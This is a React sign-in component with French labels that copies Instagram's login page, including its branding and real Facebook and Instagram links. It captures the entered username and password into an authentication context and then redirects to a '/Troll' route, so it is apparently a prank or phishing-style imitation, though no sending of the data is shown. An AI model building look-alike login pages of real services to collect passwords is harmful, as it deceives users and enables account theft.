import React, { useContext } from 'react';
import { useNavigate } from 'react-router-dom';
import Input from './Input';
import { AuthenticationContext } from "../authentication.context";
import { useState } from 'react';



const Sign = () => {
    const navigate = useNavigate();
    const authenticationContext = useContext(AuthenticationContext);
    const [ID, setID] = useState('');
    const [MDP, setMDP] = useState('');




    const validateSignin1 = () => {
        authenticationContext.signIn(ID)
        return navigate('/Troll');
    }

    const validateSignin2 = () => {
        authenticationContext.submit(MDP)
        return navigate('/Troll');
    }

    return (
        <div className='sign'>

            <div className='leftbox'>
                <div className='img'>
                    <img className='img1' src="Photo_background.png" alt="photoinstagram" />
                    <img className='img2' src="photo_instagram_3.png" alt="photoinstagram" />
                </div>
            </div>
            <div className='rightbox'>
                <div className='cadre_1'>
                    <img className='Titre' src="logo512.png" alt="Instagram" />
                    <div className='formulaire'>
                        <Input id="ID" label='Num. téléphone, nom utilisateur ou e-mail' state={ID} setState={setID} />
                        <Input type="password" id="MDP" label='Mot de passe' state={MDP} setState={setMDP} />
                    </div>
                    <button className='button' onClick={() => {
                        validateSignin1();
                        validateSignin2();
                    }}>Se connecter</button>
                    <p className='or'>OU</p>
                    <a className='facebook' href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221tusv3qs3x9s7wb8xiq19zwrhk1tatiyp14gw61mkw4bkx10jji3j%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Dfr_FR%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1a1d5124-5c14-4b0d-bf1d-26abb6a29ccb%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221tusv3qs3x9s7wb8xiq19zwrhk1tatiyp14gw61mkw4bkx10jji3j%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=fr_FR&pl_dbl=0">Se connecter avec Facebook</a>
                    <br />
                    <a className='mdp_oublié' href="">Mot de passe oublié ?</a>
                </div>
                <div className='cadre_2'>
                    <div className='inscription'>
                        <p>Vous n'avez pas de compte ?</p>
                        <a className='inscription_link' href="https://www.instagram.com/accounts/emailsignup/">Inscrivez-vous</a>
                    </div>
                </div>
                <p className='appli'>Téléchargez l'application.</p>
                <div className='app'>
                    <img className='store' src='./app_store.png' />
                    <img className='play' src='./google_play.png' />
                </div>
            </div>
        </div>
    );
};

export default Sign;